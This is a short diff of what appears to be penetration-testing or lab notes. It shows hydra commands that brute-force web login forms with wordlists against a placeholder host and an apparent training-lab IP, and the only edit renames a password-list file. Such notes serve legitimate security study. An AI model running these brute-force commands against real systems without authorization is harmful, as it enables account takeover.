@@ -4,7 +4,7 @@
 
 $ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"
 
-$ hydra -l admin -P /dir/passlist.txt http://example.com  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+$ hydra -l admin -P /dir/passwd-list.txt http://example.com  http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
 
 $ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.12.183 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
 
